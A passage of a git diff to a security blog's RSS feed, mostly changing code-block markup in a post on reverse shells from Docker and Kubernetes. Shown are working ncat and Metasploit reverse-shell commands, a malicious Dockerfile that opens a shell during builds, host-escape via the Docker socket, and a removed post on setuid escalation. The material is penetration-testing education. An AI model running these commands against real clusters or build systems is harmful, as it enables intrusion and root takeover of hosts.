-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/reverse_shell
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/reverse_shell
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Assuming that’s all working we’re ready to scale it up to our Kubernetes cluster&lt;/p&gt;
@@ -560,9 +635,9 @@ set ExitOnSession false
 
 &lt;p&gt;This should work fine, unless the cluster has a PodSecurityPolicy blocking the mounting of the docker socket inside a container.&lt;/p&gt;
 
-&lt;p&gt;We’ll call our manifest &lt;code class=&quot;highlighter-rouge&quot;&gt;reverse-shell-daemonset.yml&lt;/code&gt; and it should contain this :-&lt;/p&gt;
+&lt;p&gt;We’ll call our manifest &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse-shell-daemonset.yml&lt;/code&gt; and it should contain this :-&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
 kind: DaemonSet
 metadata:
   name: reverse-shell-daemonset
@@ -593,7 +668,7 @@ spec:
 
 &lt;p&gt;Once you’ve got your manifest ready, just apply it to the cluster with&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f reverse-shell-daemonset.yml
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f reverse-shell-daemonset.yml
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Back on your metasploit console you should see your shells pop in, one for each node :)&lt;/p&gt;
@@ -602,17 +677,17 @@ spec:
 
 &lt;p&gt;So once you’ve got your shells working, you can interact with them from the Metasploit console&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -l 
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -l 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Will show you your active sessions.  Then&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -i 1
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sessions -i 1
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Will let you interact with one of them&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;should give you a shell inside the container running on one of our nodes. Now the last part is to use the exposed Docker Socket to get a root shell on the underlying host.&lt;/p&gt;
@@ -621,7 +696,7 @@ spec:
 
 &lt;p&gt;Running&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;and it’ll dump us out to a root shell on the underlying node :)&lt;/p&gt;
@@ -639,12 +714,12 @@ spec:
 
 &lt;h2 id=&quot;reverse-shell-from-docker-run&quot;&gt;Reverse shell from docker run&lt;/h2&gt;
 
-&lt;p&gt;Here we want to push a reverse shell back from a machine that we have &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; access to, this one is pretty simple&lt;/p&gt;
+&lt;p&gt;Here we want to push a reverse shell back from a machine that we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker run&lt;/code&gt; access to, this one is pretty simple&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
 We just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -l -p 8989
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -l -p 8989
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;
@@ -652,24 +727,24 @@ Here we just need a Docker image that has ncat available. I’ve got one &lt;a h
 
 &lt;p&gt;So we just run this image with ncat parameters to connect back to the pentester machine on 192.168.200.1&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/ncat 192.168.200.1 8989 -e /bin/sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;reverse-shell-from-a-dockerfile&quot;&gt;Reverse Shell from a Dockerfile&lt;/h2&gt;
 
-&lt;p&gt;So in our next scenario we’ve got the ability to get our Target Machine to do a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; on a &lt;code class=&quot;highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.&lt;/p&gt;
+&lt;p&gt;So in our next scenario we’ve got the ability to get our Target Machine to do a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build&lt;/code&gt; on a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; that we control.  This is common in places where there are CI/CD processes like Jenkins or Drone, or cloud container building services.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
 Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target Machine&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;Here we need to construct our Dockerfile to pass into the process, this one should work based on a base ubuntu:18.04 image&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
 
 RUN apt update &amp;amp;&amp;amp; apt install -y nmap
 
@@ -678,7 +753,7 @@ RUN ncat 192.168.200.1 8989 -e /bin/sh
 CMD [&quot;/bin/bash&quot;]
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;when the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command is executed, the reverse shell will pop during the build process.&lt;/p&gt;
+&lt;p&gt;when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker build&lt;/code&gt; command is executed, the reverse shell will pop during the build process.&lt;/p&gt;
 
 &lt;h2 id=&quot;kubernetes-cluster&quot;&gt;Kubernetes Cluster&lt;/h2&gt;
 
@@ -687,14 +762,14 @@ CMD [&quot;/bin/bash&quot;]
 &lt;p&gt;&lt;strong&gt;Pentester Machine - 192.168.200.1&lt;/strong&gt;
 Same as last time, we just need to start a listener to wait for our shell to come in.  The command below will open a shell on port 8989/TCP to wait for a connection&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncap -l -p 8989
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;Target Cluster&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;, although this will fail if a restrictive &lt;code class=&quot;highlighter-rouge&quot;&gt;PodSecurityPolicy&lt;/code&gt; is in place.&lt;/p&gt;
+&lt;p&gt;So we just need a Pod manifest that will open a reverse shell on your pentester machine when created.  The example below will create that kind of pod and additionally will mount the hosts root filesystem into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/host&lt;/code&gt;, although this will fail if a restrictive &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PodSecurityPolicy&lt;/code&gt; is in place.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
 kind: Pod
 metadata:
   name: ncat-reverse-shell-pod
@@ -720,64 +795,6 @@ spec:
 				<pubDate>Fri, 09 Aug 2019 10:10:39 +0100</pubDate>
 				<link>/blog/2019/08/09/docker-reverse-shells/</link>
 				<guid isPermaLink="true">/blog/2019/08/09/docker-reverse-shells/</guid>
-			</item>
-		
-			<item>
-				<title>Docker Capabilities and no-new-privileges</title>
-				<description>&lt;p&gt;I’ve been looking for a way to explain an demonstrate the “no-new-privileges” option in Docker for a little while for my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/#mastering-container-security-14020&quot;&gt;training course&lt;/a&gt; and recently came up with a way that should work, so thought it was worth a blog post.&lt;/p&gt;
-
-&lt;h2 id=&quot;capabilities-and-docker&quot;&gt;Capabilities and Docker&lt;/h2&gt;
-
-&lt;p&gt;First a little background.  Docker makes use of &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;capabilities&lt;/a&gt; as one of the layers of security that it applies to all new containers. Capabilities are essentially pieces of the privileges that the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user gets on a Linux system.  They enable processes to perform some privileged operations without having the full power of that user, and are very useful to get away from the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;setuid&lt;/code&gt; binaries. Docker applies a restriction that when a new container is started, even if the root user is used, it won’t get all the capabilities of root, just a subset.&lt;/p&gt;
-
-&lt;p&gt;An important point to note is that, if your process doesn’t need any “root-like” privileges, it shouldn’t need any capabilities, and processes started by ordinary users don’t generally get granted any capabilities.&lt;/p&gt;
-
-&lt;p&gt;For more details on Docker and capabilities there’s a post &lt;a href=&quot;https://raesene.github.io/blog/2017/08/27/Linux-capabilities-and-when-to-drop-all/&quot;&gt;here&lt;/a&gt; that goes into some more depth on the topic.&lt;/p&gt;
-
-&lt;h2 id=&quot;no-new-privileges&quot;&gt;no-new-privileges&lt;/h2&gt;
-
-&lt;p&gt;So where does no-new-privileges come into all this?  Well this is an option that can be passed as part of a &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; statement as a security option.  The Docker documentation on it says you can use it&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;If you want to prevent your container processes from gaining additional privileges
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Basically if your container runs as a non-root user (as all good containers should) this can be used to stop processes inside the container from getting additional privileges.&lt;/p&gt;
-
-&lt;p&gt;Here’s a practical example.  Say we have a Dockerfile that looks like this&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
-
-RUN cp /bin/bash /bin/setuidbash &amp;amp;&amp;amp; chmod 4755 /bin/setuidbash
-
-RUN useradd -ms /bin/bash newuser
-
-USER newuser
-
-CMD [&quot;/bin/bash&quot;]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We’ve got another bash shell which we’ve made setuid root, meaning that it can be used to get root level privileges (albeit still constrained by Docker’s default capability set).&lt;/p&gt;
-
-&lt;p&gt;If we build this Dockerfile as &lt;code class=&quot;highlighter-rouge&quot;&gt;nonewpriv&lt;/code&gt; then run&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it nonewpriv
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;we get landed into a bash shell as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user.  Running &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; at this point will make us root demonstrating that we’ve effectively escalated our privileges inside the container.&lt;/p&gt;
-
-&lt;p&gt;Now if we try launching the same container, but add the no-new-privileges flag&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --security-opt=no-new-privileges:true nonewpriv
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;when we run &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/setuidbash -p&lt;/code&gt; our escalation to root doesn’t work and our new bash shell stays running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;newuser&lt;/code&gt; user, foiling our privilege escalation attempt :)&lt;/p&gt;
-
-&lt;p&gt;So, this option is one worth considering if you’ve got containers being launched as a non-root user and you want to reduce the risk of malicious processes in the container trying to get additional rights.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Edit&lt;/strong&gt; Just to add based on conversations on twitter following this post, it’s worth noting that you can achieve the same effect as &lt;code class=&quot;highlighter-rouge&quot;&gt;no-new-privileges&lt;/code&gt;, if you want to run your container as a non-root user, by doing &lt;code class=&quot;highlighter-rouge&quot;&gt;cap-drop=all&lt;/code&gt; as part of the run statement.  This has a similar effect in stopping the contained processes from gaining any Linux capabilities, and if your workloads support it, is a great idea for hardening your containers.&lt;/p&gt;
-</description>
-				<pubDate>Sat, 01 Jun 2019 10:10:39 +0100</pubDate>
-				<link>/blog/2019/06/01/docker-capabilities-and-no-new-privs/</link>
-				<guid isPermaLink="true">/blog/2019/06/01/docker-capabilities-and-no-new-privs/</guid>
 			</item>
 		
 	</channel>
